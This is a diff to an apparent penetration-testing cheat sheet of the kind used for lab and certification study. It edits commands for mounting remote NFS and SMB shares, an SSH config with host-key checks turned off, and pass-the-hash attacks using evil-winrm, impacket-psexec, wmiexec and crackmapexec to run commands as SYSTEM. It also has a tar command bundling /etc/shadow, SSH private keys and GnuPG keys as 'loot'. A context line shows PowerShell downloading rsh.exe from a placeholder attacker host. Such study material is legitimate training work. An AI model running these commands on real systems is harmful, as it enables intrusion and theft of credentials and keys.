@@ -1937,7 +1937,7 @@ invoke-webrequest -uri http://ATTACKER/rsh.exe -out c:\users\public\rsh.exe
 ### 7.2.4. Mount NFS Share
 
 ```sh
-mount -t nfs -o vers=3 10.1.1.1:/home/ /mnt/nfs-share
+mount -t nfs -o vers=3 REMOTE_IP:/home/ /mnt/nfs-share
 ```
 
 ### 7.2.5. SMB Share
@@ -1945,7 +1945,7 @@ mount -t nfs -o vers=3 10.1.1.1:/home/ /mnt/nfs-share
 Mounting/hosting share on Kali
 ```sh
 # mount foreign SMB share on Kali
-sudo mount -t cifs -o vers=1.0 //10.11.1.136/'Sharename' /mnt/smbshare
+sudo mount -t cifs -o vers=1.0 //REMOTE_IP/'Sharename' /mnt/smbshare
 
 # host SMB share on kali (note: 'share' is share name)
 sudo impacket-smbserver share .
@@ -2026,7 +2026,7 @@ To make things easier, set up a config file like so:
 
 ```
 Host alpha
-    HostName 10.11.1.71
+    HostName REMOTE_IP
     User root
     StrictHostKeyChecking no
     UserKnownHostsFile /dev/null
@@ -2191,15 +2191,23 @@ impacket-secretsdump DOMAIN/username:Password@DC_IP_or_FQDN -just-dc-ntlm | tee 
 
 ### 7.3.6. Pass The Hash Attacks on Windows
 
+Note: Windows hashes are in the form LMHASH:NTHASH. That convention is used here.
+
 ```sh
 # Get remote powershell shell by passing the hash
 # install: sudo gem install evil-winrm
-evil-winrm.rb -i VICTIM_IP -u username -H NTLM_HASH
+evil-winrm.rb -i VICTIM_IP -u username -H NTHASH
 
-# Run remote command (note colon before NTLM hash)
-psexec.py -hashes :0e0363213e37b94221497260b0bcb4fc administrator@VICTIM_IP whoami
+# Run remote command as SYSTEM (note colon before NT hash)
+impacket-psexec -hashes :NTHASH administrator@VICTIM_IP whoami
+# omit the command to get interactive shell
 
-# other options: xfreerdp, crackmapexec, pth-winexe
+impacket-wmiexec DOMAIN/Administrator@VICTIM_IP -hashes LMHASH:NTHASH
+
+# execute remote command as Admin (IP MUST GO LAST!)
+crackmapexec smb -d DOMAIN -u Administrator -H LMHASH:NTHASH -x whoami VICTIM_IP
+
+# other options: xfreerdp, smbclient, pth-winexe
 ```
 
 ## 7.4. Linux Files of Interest
@@ -2209,12 +2217,12 @@ psexec.py -hashes :0e0363213e37b94221497260b0bcb4fc administrator@VICTIM_IP whoa
 tar zcf loot.tar.gz \
 /etc/passwd{,-} \
 /etc/shadow{,-} \
-"/etc/ssh/ssh_host_*" \
-"/home/*/.ssh/id*" \
-"/home/*/.gnupg" \
-"/root/*/.gnupg" \
-"/root/.ssh/id*" \
-"/root/proof.txt"
+/etc/ssh/ssh_host_* \
+/home/*/.ssh/id* \
+/home/*/.gnupg \
+/root/*/.gnupg \
+/root/.ssh/id* \
+/root/proof.txt
 ```
 
 ## 7.5. Data Wrangling on Linux
